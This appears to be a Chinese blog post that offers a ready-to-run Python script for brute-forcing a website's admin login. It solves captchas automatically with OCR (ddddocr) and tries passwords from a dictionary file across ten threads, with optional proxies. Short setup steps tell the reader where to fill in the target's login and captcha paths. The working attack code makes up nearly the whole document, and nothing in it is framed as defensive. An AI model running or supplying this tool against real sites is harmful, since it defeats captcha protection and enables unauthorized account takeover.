# 验证码自动识别的多线程爆破脚本


<!--more-->

* 修改目标url的登录路径和验证码路径
* 修改相应的请求头和请求参数
* 将字典放到当前目录下命名为password.txt
* 如需挂代理可自行设置代理

```python
import requests
import json
import fileinput
import ddddocr
import queue
import threading
import urllib3
from colorama import Fore
from rich.progress import Progress
import sys

# 控制最大线程量
sem=threading.Semaphore(10)
url = ''
uname = 'admin'

ocr = ddddocr.DdddOcr(show_ad=False)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    }

proxies = {
    }

# 测试代理
def testProxies():
    response=requests.get('http://httpbin.org/ip', proxies=proxies, timeout=5, verify=False)
    return json.loads(response.text)['origin']

# 获取验证码
def getCaptcha(AuthSession):
    response =  AuthSession.get(url + '/验证码路径', headers=headers, proxies=proxies, timeout=5, verify=False)
    res = ocr.classification(response.content)
    return res

#登陆请求
def login(AuthSession,uname,pwd,sem,progress,task):
    try:
        u = url + '/登录路径'
        d = {
            'username': uname, 
            'password': pwd,
            'captcha':getCaptcha(AuthSession)
        }
        response = AuthSession.post(u, data=d, headers=headers, proxies=proxies, timeout=5, verify=False)
        response = json.loads(response.text)
        if response['msg'] == '密码错误':
            print(Fore.RED + response['msg'] + '      密码：' + pwd)
        elif response['msg'] == "验证码错误":
            print(Fore.YELLOW + response['msg'] + '      密码：' + pwd)
            login(AuthSession,uname,pwd,sem,progress,task)
            return
        else:
            print(Fore.GREEN + response['msg'] + '      密码：' + pwd)
            sys.exit()
        if not progress.finished:
            progress.update(task, advance=1)
        sem.release()
    except:
        print('login发生错误')

def main():
    threads = []
    q = queue.Queue()
    with fileinput.input(files=(r'password.txt'),openhook=fileinput.hook_encoded("utf-8")) as f:
        for line in f:
            q.put(line)
        with Progress() as progress:
            task = progress.add_task("[yellow]本地IP"+testProxies(), total=q.qsize())
            for i in range(q.qsize()):
                sem.acquire()
                AuthSession = requests.session()
                td = threading.Thread(target=login,args=(AuthSession,uname,q.get().replace("\n", ""),sem,progress,task))
                threads.append(td)
                td.start()
            for t in threads:
                t.join() 

if __name__=="__main__":
    main()
```


